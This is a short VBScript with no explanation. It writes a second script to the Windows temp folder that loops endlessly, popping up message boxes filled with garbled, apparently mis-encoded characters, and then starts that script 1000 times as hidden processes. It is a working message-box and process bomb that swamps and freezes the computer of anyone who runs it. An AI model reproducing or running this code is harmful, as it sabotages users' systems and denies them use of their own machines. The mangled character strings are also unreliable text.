Set ws = CreateObject("WScript.Shell")
tmp = CreateObject("Scripting.FileSystemObject").GetSpecialFolder(2)
f = tmp & "\p.vbs"

Set f2 = CreateObject("Scripting.FileSystemObject").CreateTextFile(f, True)
f2.WriteLine "Do"
f2.WriteLine "  s = """""
f2.WriteLine "  For i = 1 To 500"
f2.WriteLine "    s = s & ""§¾²´"""
f2.WriteLine "  Next"
f2.WriteLine "  MsgBox s, 0, ""§¾²´"""
f2.WriteLine "Loop"
f2.Close

For n = 1 To 1000
  ws.Run "wscript.exe """ & f & """", 0, False
Next
